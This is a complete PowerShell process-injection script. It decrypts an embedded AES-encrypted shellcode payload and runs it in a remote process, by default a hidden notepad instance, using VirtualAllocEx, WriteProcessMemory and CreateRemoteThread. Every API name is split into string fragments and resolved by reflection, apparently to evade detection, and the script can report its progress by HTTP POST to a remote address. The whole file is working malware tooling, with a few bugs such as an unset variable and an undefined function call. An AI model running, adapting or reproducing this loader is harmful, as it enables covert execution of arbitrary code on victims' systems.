<#
.SYNOPSIS
    Injects shellcode into remote process.
.DESCRIPTION
    Injects shellcode into remote process.
.PARAMETER RemoteProcessName
    The name of the process to inject shellcode into.
.PARAMETER RemoteDebugIP
    The IP address to connect to for remote debugging.
.PARAMETER RemoteDebugPort
    The port to connect to for remote debugging.
#>

#------[Declarations]------#
[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [String]$rPN,
    [Parameter(Mandatory = $false)]
    [String]$RemoteDebugIP,
    [Parameter(Mandatory = $false)]
    [Int]$RemoteDebugPort = 8080
)

$Debug = $true

#------[Functions]------#
function Send-Debug($Message) {
    if ($Debug) {
        Write-Host $Message
    }
    
    # If remote debug IP is specified, send debug message to remote IP using HTTP POST request
    if ($RemoteDebugIP) {
        $url = "http://$($RemoteDebugIP):$($RemoteDebugPort)"
        $body = @{message=$Message} | ConvertTo-Json
        Invoke-WebRequest -Uri $url -Method POST -Body $body | Out-Null
    }
}

function GetAddress($m, $f) {
    $sA = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split("\\")[-1] -eq "Sy" + "ste" + "m.dll"}

    $uNM = ForEach ($t in $sA.GetTypes()) {
        $t | Where-Object {$_.FullName -like "*Nati" + "veM" + "ethods" -and $_.Fullname -like "*Win32*" -and $_.Fullname -like "*Un*"}
    }

    $mH = $uNM.GetMethods() | Where-Object {$_.Name -like "*Handle" -and $_.Name -like "*Module*"} | Select-Object -First 1
    $pA = $uNM.GetMethod("Ge" + "tPro" + "cAdd" + "ress", [type[]]("IntPtr", "System.String"))

    $m = $mH.Invoke($null, @($m))
    $pA.Invoke($null, @($m, $f))
}

function GetType($f, $dT = [Void]) {
    $t = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", 
    [System.MulticastDelegate])

    $t.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $f).SetImplementationFlags("Runtime, Managed")
    $t.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $dT, $f).SetImplementationFlags("Runtime, Managed")

    return $t.CreateType()
}

function IsElevated() {
    $wI = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $wP = New-Object System.Security.Principal.WindowsPrincipal($wI)
    $wP.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-Arch {
    if ([IntPtr]::Size -eq 4) {
        return "x86"
    } elseif ([IntPtr]::Size -eq 8) {
        return "x64"
    } else {
        return $null
    }
}

function Invoke-RInject {
    # Get architecture
    $Arch = Get-Arch
    if ($Debug) {
        Send-Debug "[+] Architecture: $Arch"
    }

    # Check if process name is specified
    if ($null -eq $rPN -or $rPN -eq "") {
        $rPN = "notepad"
        if ($Debug) {
            Send-Debug "[!] No process name specified. Using notepad as default."
        }
        
        # Check if notepad process exists
        $rP = Get-Process -Name $rPN -ErrorAction SilentlyContinue
        if ($null -eq $rP) {
            if ($Debug) {
                Send-Debug "[!] $rPN is not running. Trying to start $rPN." 
            }
            
            # Start notepad process hidden
            $rP = Start-Process -FilePath $rPN -WindowStyle Hidden -PassThru
            if ($null -eq $rP) {
                if ($Debug) {
                    Send-Debug "[!] Failed to start $rPN." 
                }
                return
            }
        }
    }

    # Check if process exists
    $rP = Get-Process -Name $rPN -ErrorAction SilentlyContinue
    if ($null -eq $rP) {
        if ($Debug) {
            Send-Debug "[!] Process $rPN does not exist." 
        }
        return
    } else {
        if ($Debug) {
            Send-Debug "[+] Process $rPN exists." 
        }
    }

    # Get process id
    $rPId = $rP.Id[0]
    if ($Debug) {
        Send-Debug "[+] Process ID: $rPId"
    }

    # Get process handle
    $oP = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("kerne" + "l32.dll") ("Ope" + "nProc" + "ess")), (GetType @([UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $rPH = $OP.Invoke(0x001F0FFF, $false, $rPId)

    if ($rPH -eq 0) {
        if ($Debug) {
            Send-Debug "[!] Failed to get handle on process: $($rPN) (PID: $($rPId))" 
            Send-Debug "[!] Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }
        return
    } else {
        if ($Debug) {
            Send-Debug "[+] Got a handle on process: $($rPN) (PID: $($rPId)) (Handle: 0x$($rPH))" 
        }
    }

    $vAx = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("ker" + "nel3" + "2.dll") ("Virtu" + "alAl" + "locEx")), (GetType @([IntPtr], [UInt32], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $vA = $vAx.Invoke($rPH, 0, 0x1000, 0x3000, 0x40)

    if ($vA -eq 0) {
        if ($Debug) {
            Send-Debug "[!] Failed to allocate memory in process: $($rPN) (PID: $($rPId))" 
            Send-Debug "[!] Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }
        return
    } else {
        if ($Debug) {
            Send-Debug "[+] Allocated memory in process: $($rPN) (PID: $($rPId)) (Address: 0x$($vA))" 
        }
    }
    
    
    ## shellcode here
    $Key = [System.Convert]::FromBase64String("8GANKPlv4tcb7YgQEhenpJkEyeWV0JCviu0EEMhOlk8=")
    $IV = [System.Convert]::FromBase64String("IWkN5qRZEWGY/AMstZ2TRw==")
    $EncryptedBytes = [System.Convert]::FromBase64String("WqmNievG0YY1ORWd2PLGjR7JuqneOQz08Y63KHtGS/8N4Dg8qRXMA9ACQoVQ7DbMv1t1G0ue2fpq9ss2JZFNOGSft3rH1VquwmkcInhGEEeIntgih6CoP2/krSf6q0J+axhghn6LgiPQYhmpoDuOPvgAsofaDtAem/GtQ4W+oxa4pVRKY2s4xPEi2M3IDQSlrXvTO3A/KQZwuEOXcTPr0EztltCT4lHs9N+CuxOvS174FQRcuy8ga2tuJfJC7vkPei1WtNJtzZEhNbrv1l0x0PGzne66Kqowco/HxCawkzDlCpMBUgHh1jWZwdAUTOyaEb/FyClsw459Cm5I30NB6GLRcr3RkTRhUOeU9iu+QYKrh+XVMNtF4HvHKLyJy8pntnV431/4kdAo7zxNnlfUaL9luEzkyfqZiFoqzN7Lx6nKnxP3T/sl4Owoxf9fF/+jtXxFsRv9zSQcME4tdx+DbCULn4Q4zTkxslDd2hv+LTCbuuTNGhfOpXAGCs/6xOkkPEzMAxBT4aA6gOhGuCbmwp2x/FLE5KMJMmFpd48O7oILPkX4e5h7Hq1WThvIM/2Ou2Ssp/Nkw/hVLKHsmNeC1yI38gA190mhxxc5ERKvtLG16btsf9lVI79xer06PvPmHZOptG7/8/Sl1JF9Ma2biY/T13uYQXP5T2C639e8nWI=")

    $AesManaged = New-Object Security.Cryptography.AesManaged
    $AesManaged.Key = $Key
    $AesManaged.IV = $IV
    $AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
    $AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    $Decryptor = $AesManaged.CreateDecryptor($AesManaged.Key, $AesManaged.IV)

    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        
    [Byte[]] $buf = $DecryptedBytes

    # Write shellcode to memory
    $wPM = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("ker" + "nel3" + "2.dll") ("Writ" + "eProc" + "essMem" + "ory")), (GetType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
    $wPM.Invoke($rPH, $vA, $buf, $buf.Length, 0) | Out-Null

    if ($wA -eq 0) {
        if ($Debug) {
            Send-Debug "[!] Failed to write shellcode to memory in process: $($rPN) (PID: $($rPId))" 
            Send-Debug "[!] Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }
        return
    } else {
        if ($Debug) {
            Send-Debug "[+] Wrote shellcode to memory in process: $($rPN) (PID: $($rPId))" 
        }
    }

    # Create thread
    if (Get-Arch -eq "x86") {
        $cT = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("ker" + "nel3" + "2.dll") ("Crea" + "teRemoteThr" + "ead")), (GetType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
    } else {
        $cT = [System.Runtime.InteropServices.Marshal]::("{2}{3}{5}{4}{1}{0}" -f "Pointer","nction","GetDelega","teFo","u","rF").Invoke((GetAddress ("ker" + "nel3" + "2.dll") ("Crea" + "teRemoteThr" + "ead")), (GetDelegateType @([IntPtr], [IntPtr], [UInt64], [IntPtr], [IntPtr], [UInt64], [IntPtr]) ([IntPtr])))

    }

    $t = $cT.Invoke($rPH, 0, 0, $vA, 0, 0, 0) | Out-Null

    if ($t -eq 0) {
        if ($Debug) {
            Send-Debug "[!] Failed to create thread in process: $($rPN) (PID: $($rPId))" 
            # Marshal.GetLastWin32Error Method
            Send-Debug "[!] Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }
        return
    } else {
        if ($Debug) {
            Send-Debug "[+] Created thread in process: $($rPN) (PID: $($rPId))" 
        }
    }
}

#------[Execution]------#
Invoke-RInject